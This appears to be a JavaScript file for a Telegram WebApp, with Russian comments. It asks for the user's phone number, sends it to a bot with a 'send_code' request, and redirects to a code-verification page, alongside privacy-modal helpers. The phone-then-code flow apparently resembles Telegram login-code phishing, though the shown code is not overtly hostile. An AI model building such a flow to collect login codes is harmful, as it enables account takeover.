// Функция запроса номера телефона через Telegram WebApp
function requestPhoneNumber() {
    // Проверяем, запущено ли приложение в Telegram
    if (window.Telegram && window.Telegram.WebApp) {
        // Инициализируем WebApp
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
        
        // Запрашиваем номер телефона (ТОЛЬКО через Telegram WebApp!)
        window.Telegram.WebApp.requestContact((contact) => {
            if (contact && contact.phone_number) {
                // Сохраняем номер
                localStorage.setItem('phoneNumber', contact.phone_number);
                
                // Отправляем запрос на отправку кода боту
                sendCodeToBot(contact.phone_number);
                
                // Переходим на страницу ввода кода
                window.location.href = 'code-verification.html';
            } else {
                alert('❌ Не удалось получить номер телефона');
            }
        });
    } else {
        // Если не в Telegram - показываем ошибку
        alert('❌ Это приложение работает только в Telegram!');
    }
}

// Функция отправки запроса на код боту
function sendCodeToBot(phone) {
    if (window.Telegram && window.Telegram.WebApp) {
        const data = {
            action: 'send_code',
            phone: phone
        };
        
        // Отправляем данные боту
        window.Telegram.WebApp.sendData(JSON.stringify(data));
        console.log('📱 Запрос на отправку кода отправлен боту');
    }
}

// Функции для модального окна
function showPrivacyModal() {
    document.getElementById('privacyModal').style.display = 'block';
    document.body.style.overflow = 'hidden';
}

function closePrivacyModal() {
    document.getElementById('privacyModal').style.display = 'none';
    document.body.style.overflow = 'auto';
}

// Закрытие модального окна при клике вне его
window.onclick = function(event) {
    const modal = document.getElementById('privacyModal');
    if (event.target === modal) {
        closePrivacyModal();
    }
}

// Закрытие модального окна по Escape
document.addEventListener('keydown', function(event) {
    if (event.key === 'Escape') {
        closePrivacyModal();
    }
});
